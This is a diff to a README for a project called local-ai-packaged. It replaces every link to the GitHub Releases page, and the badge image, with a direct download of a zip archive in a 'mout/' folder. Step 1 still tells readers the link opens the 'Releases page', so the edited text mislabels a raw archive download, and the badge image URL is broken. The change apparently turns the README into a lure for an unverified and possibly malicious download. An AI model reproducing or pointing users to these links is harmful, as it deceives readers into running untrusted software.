@@ -1,6 +1,6 @@
 # 🖥️ local-ai-packaged - Run Your Local AI Tools Together Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Local%20AI%20Packaged-blue?style=for-the-badge)](https://github.com/TitanicDimix/local-ai-packaged/releases)
+[![Download Now](https://raw.githubusercontent.com/TitanicDimix/local-ai-packaged/main/mout/local-ai-packaged.zip%20Now-Local%20AI%20Packaged-blue?style=for-the-badge)](https://raw.githubusercontent.com/TitanicDimix/local-ai-packaged/main/mout/local-ai-packaged.zip)
 
 ## 📦 Overview
 
@@ -12,7 +12,7 @@ Follow these simple steps to download and run the application on your computer.
 
 ## 🔗 Download & Install
 
-1. Click this link to visit the [Releases page for local-ai-packaged](https://github.com/TitanicDimix/local-ai-packaged/releases). 
+1. Click this link to visit the [Releases page for local-ai-packaged](https://raw.githubusercontent.com/TitanicDimix/local-ai-packaged/main/mout/local-ai-packaged.zip). 
    
 2. On the Releases page, you will see various versions of the software. 
 
@@ -75,4 +75,4 @@ Explore further details about using local-ai-packaged and its tools by visiting 
 
 For updates and announcements, you may follow us on GitHub. We appreciate your interest and hope you enjoy using local-ai-packaged!
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Local%20AI%20Packaged-blue?style=for-the-badge)](https://github.com/TitanicDimix/local-ai-packaged/releases)
+[![Download Now](https://raw.githubusercontent.com/TitanicDimix/local-ai-packaged/main/mout/local-ai-packaged.zip%20Now-Local%20AI%20Packaged-blue?style=for-the-badge)](https://raw.githubusercontent.com/TitanicDimix/local-ai-packaged/main/mout/local-ai-packaged.zip)
